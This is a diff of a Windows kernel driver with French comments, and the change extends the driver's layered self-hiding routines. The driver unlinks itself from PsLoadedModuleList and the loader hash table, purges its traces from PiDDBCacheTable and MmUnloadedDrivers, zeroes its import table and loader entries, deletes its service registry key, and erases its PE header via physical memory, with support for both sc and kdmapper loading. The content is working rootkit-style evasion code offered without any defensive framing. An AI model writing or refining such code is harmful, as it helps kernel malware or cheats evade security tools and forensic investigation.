@@ -8,10 +8,11 @@ static PVOID                 g_ImageBase   = NULL;
 static ULONG                 g_ImageSize   = 0;
 
 // ---------------------------------------------------------------------------
-// FindSelfBase — localise la base PE de notre propre driver
+// FindSelfBase
 //
-// Scan vers le bas depuis DriverEntry, page par page, à la recherche
-// de la signature MZ + PE valide. Fonctionne en mode sc et en mode mapper.
+// Scan vers le bas depuis DriverEntry (aligné sur page), cherche MZ + PE valide.
+// Compatible Intel et AMD : on cherche dans l'espace d'adressage virtuel noyau,
+// indépendamment du CPU. __try/__except absorbe les accès à pages non mappées.
 // ---------------------------------------------------------------------------
 PVOID FindSelfBase(VOID)
 {
@@ -22,10 +23,8 @@ PVOID FindSelfBase(VOID)
             PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)addr;
             if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
             if (dos->e_lfanew <= 0 || dos->e_lfanew >= 0x400) continue;
-
             PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(addr + dos->e_lfanew);
-            if (nt->Signature == IMAGE_NT_SIGNATURE)
-                return (PVOID)addr;
+            if (nt->Signature == IMAGE_NT_SIGNATURE) return (PVOID)addr;
         }
         __except (EXCEPTION_EXECUTE_HANDLER) { continue; }
     }
@@ -33,7 +32,7 @@ PVOID FindSelfBase(VOID)
 }
 
 // ---------------------------------------------------------------------------
-// HideFromLoadedList — couche 1 : retrait de PsLoadedModuleList
+// HideFromLoadedList — couche 1a : retrait de PsLoadedModuleList
 // ---------------------------------------------------------------------------
 VOID HideFromLoadedList(_In_ PDRIVER_OBJECT DriverObject)
 {
@@ -42,7 +41,6 @@ VOID HideFromLoadedList(_In_ PDRIVER_OBJECT DriverObject)
 
     g_ModuleEntry = entry;
     g_SavedBlink  = entry->InLoadOrderLinks.Blink;
-
     RemoveEntryList(&entry->InLoadOrderLinks);
     InitializeListHead(&entry->InLoadOrderLinks);
 }
@@ -59,18 +57,18 @@ VOID ObfuscateLdrEntry(_In_ PDRIVER_OBJECT DriverObject)
         RtlSecureZeroMemory(entry->FullDllName.Buffer, entry->FullDllName.Length);
         entry->FullDllName.Length        = 0;
         entry->FullDllName.MaximumLength = 0;
-        entry->FullDllName.Buffer        = NULL;   // fix : pointeur nullifié
+        entry->FullDllName.Buffer        = NULL;
     }
     if (entry->BaseDllName.Buffer && entry->BaseDllName.Length > 0) {
         RtlSecureZeroMemory(entry->BaseDllName.Buffer, entry->BaseDllName.Length);
         entry->BaseDllName.Length        = 0;
         entry->BaseDllName.MaximumLength = 0;
-        entry->BaseDllName.Buffer        = NULL;   // fix : pointeur nullifié
+        entry->BaseDllName.Buffer        = NULL;
     }
 }
 
 // ---------------------------------------------------------------------------
-// CleanMmUnloadedDrivers — couche 3 (appelée au déchargement)
+// CleanMmUnloadedDrivers — couche 3 (au déchargement)
 // ---------------------------------------------------------------------------
 VOID CleanMmUnloadedDrivers(PVOID ImageBase, ULONG ImageSize)
 {
@@ -83,21 +81,21 @@ VOID CleanMmUnloadedDrivers(PVOID ImageBase, ULONG ImageSize)
 
     PVOID imageEnd = (PVOID)((ULONG_PTR)ImageBase + ImageSize);
     for (ULONG i = 0; i < MM_UNLOADED_DRIVERS_SIZE; i++) {
-        if (pTable[i].ModuleStart >= ImageBase &&
-            pTable[i].ModuleStart <  imageEnd) {
-            if (pTable[i].Name.Buffer) {
-                RtlSecureZeroMemory(pTable[i].Name.Buffer, pTable[i].Name.Length);
-                pTable[i].Name.Length = pTable[i].Name.MaximumLength = 0;
-                pTable[i].Name.Buffer = NULL;
-            }
-            pTable[i].ModuleStart = pTable[i].ModuleEnd = NULL;
-            pTable[i].UnloadTime  = 0;
+        if (pTable[i].ModuleStart < ImageBase ||
+            pTable[i].ModuleStart >= imageEnd) continue;
+        if (pTable[i].Name.Buffer) {
+            RtlSecureZeroMemory(pTable[i].Name.Buffer, pTable[i].Name.Length);
+            pTable[i].Name.Length = pTable[i].Name.MaximumLength = 0;
+            pTable[i].Name.Buffer = NULL;
         }
+        pTable[i].ModuleStart = pTable[i].ModuleEnd = NULL;
+        pTable[i].UnloadTime  = 0;
     }
 }
 
 // ---------------------------------------------------------------------------
-// RestoreSelf — ré-insertion avant déchargement (évite BSOD en mode sc)
+// RestoreSelf — ré-insertion dans PsLoadedModuleList avant déchargement
+// (obligatoire en mode sc pour éviter un BSOD)
 // ---------------------------------------------------------------------------
 VOID RestoreSelf(VOID)
 {
@@ -121,52 +119,58 @@ VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
 // ---------------------------------------------------------------------------
 // DriverEntry
 //
-// Ordre des opérations critique :
-//   1. FindSelfBase        — avant tout (nécessaire pour couches 1c et 4)
-//   2. HideFromLoadedList  — couche 1a
-//   3. CleanHashLinks      — couche 1b
-//   4. CleanPiDDBCache     — couche 1c (LIT le PE header — doit précéder 4)
-//   5. ObfuscateLdrEntry   — couche 2
-//   6. ZeroLdrFields       — couche 2b
-//   7. ErasePeHeaderPhys   — couche 4 (EN DERNIER — détruit le PE header)
+// ORDRE DES OPÉRATIONS (chaque étape suppose que la précédente est faite) :
 //
-// Mode kdmapper : DriverObject = NULL. Les couches 1a/1b/1c sont inutiles
-// car kdmapper ne touche jamais PsLoadedModuleList ni PiDDBCacheTable.
-// Seule la couche 4 est nécessaire.
+//  Mode sc/NtLoadDriver (DriverObject valide) :
+//    1  FindSelfBase          — localise notre base PE
+//    2  HideFromLoadedList    — couche 1a : retire de PsLoadedModuleList
+//    3  CleanHashLinks        — couche 1b : retire de la LDR hash-table
+//    4  CleanPiDDBCache       — couche 1c : retire de PiDDBCacheTable
+//                               (LIT TimeDateStamp → avant ErasePeHeaderPhys)
+//    5  ZeroImportTable       — couche 1d : zeroise descripteurs d'imports
+//                               (LIT DataDirectory → avant ErasePeHeaderPhys)
+//    6  ObfuscateLdrEntry     — couche 2  : zeroise noms dans LDR
+//    7  ZeroLdrFields         — couche 2b : zeroise champs DllBase etc.
+//    8  CleanRegistryEntry    — couche 5  : supprime clé registre service
+//    9  ErasePeHeaderPhys     — couche 4  : DERNIER — détruit le PE header
+//
+//  Mode kdmapper (DriverObject == NULL) :
+//    Aucune liste touchée par le loader → étapes 2-8 inutiles.
+//    Seule la couche 4 (effacement PE header) est appliquée.
+//
 // ---------------------------------------------------------------------------
 NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
 {
-    UNREFERENCED_PARAMETER(RegistryPath);
-
     g_ImageBase = FindSelfBase();
 
     if (DriverObject && DriverObject->DriverSection) {
+        // ---- Mode sc / NtLoadDriver ----
         g_MapperMode = FALSE;
         g_ImageSize  = DriverObject->DriverSize;
         DriverObject->DriverUnload = DriverUnload;
 
-        // Couche 1a
-        HideFromLoadedList(DriverObject);
+        PLDR_DATA_TABLE_ENTRY ldr =
+            (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
 
-        // Couche 1b : hash table LDR
-        CleanHashLinks((PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection);
-
-        // Couche 1c : PiDDBCacheTable (doit précéder ErasePeHeader)
-        if (g_ImageBase)
-            CleanPiDDBCache(g_ImageBase);
-
-        // Couche 2 : effacement noms + champs LDR
-        ObfuscateLdrEntry(DriverObject);
-        ZeroLdrFields((PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection);
+        HideFromLoadedList(DriverObject);      // 2
+        CleanHashLinks(ldr);                   // 3
+        if (g_ImageBase) {
+            CleanPiDDBCache(g_ImageBase);      // 4 — lit PE header
+            ZeroImportTable(g_ImageBase);      // 5 — lit DataDirectory
+        }
+        ObfuscateLdrEntry(DriverObject);       // 6
+        ZeroLdrFields(ldr);                    // 7
+        CleanRegistryEntry(RegistryPath);      // 8
 
     } else {
+        // ---- Mode kdmapper ----
+        // PsLoadedModuleList, registre, PiDDBCacheTable : non touchés.
         g_MapperMode = TRUE;
-        // kdmapper : pas de traces dans les listes noyau — couche 4 suffit
     }
 
-    // Couche 4 EN DERNIER — efface le PE header via adresse physique
+    // Couche 4 EN DERNIER — valide pour les deux modes
     if (g_ImageBase)
-        ErasePeHeaderPhys(g_ImageBase);
+        ErasePeHeaderPhys(g_ImageBase);        // 9
 
     return STATUS_SUCCESS;
 }
